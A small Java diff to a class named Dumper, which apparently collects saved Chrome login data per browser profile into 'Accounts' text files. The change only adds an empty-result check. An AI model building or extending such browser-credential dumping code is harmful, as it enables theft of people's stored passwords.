@@ -107,7 +107,7 @@ public class Dumper {
             accounts.put(new File(pathToSave, "Accounts - " + profile.getName()
                     + ".txt"), readDatabase(loginData));
         }
-        if (profiles.size() < 1) {
+        if (profiles.size() < 1 || accounts.isEmpty()) {
             throw new InstantiationException("No chrome profiles found!");
         }
         return new Dumper(accounts);
